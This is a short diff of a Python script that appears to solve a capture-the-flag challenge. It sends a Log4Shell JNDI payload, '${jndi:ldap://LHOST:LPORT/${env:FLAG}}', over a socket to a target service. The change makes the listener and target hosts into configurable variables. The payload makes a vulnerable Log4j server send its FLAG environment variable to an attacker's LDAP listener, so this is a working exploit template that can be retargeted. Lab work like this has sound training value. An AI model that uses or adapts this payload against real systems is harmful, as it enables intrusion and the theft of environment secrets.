@@ -3,7 +3,12 @@
 import socket
 import time
 
-EXPLOIT = "${jndi:ldap://localhost:1389/${env:FLAG}}"
+LHOST = "localhost"  # Address of listener
+LPORT = 1389  # Port of listener
+RHOST = "localhost"  # Address of remote host
+RPORT = 8888  # Port of remote host
+
+EXPLOIT = f"${{jndi:ldap://{LHOST}:{LPORT}/${{env:FLAG}}}}"
 
 
 def main():
@@ -22,7 +27,7 @@ def main():
 
     try:
         clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        clientsocket.connect(('localhost', 8888))  # Connect to ip address and port
+        clientsocket.connect((RHOST, RPORT))  # Connect to ip address and port
 
         time.sleep(1)
         for _ in range(20):
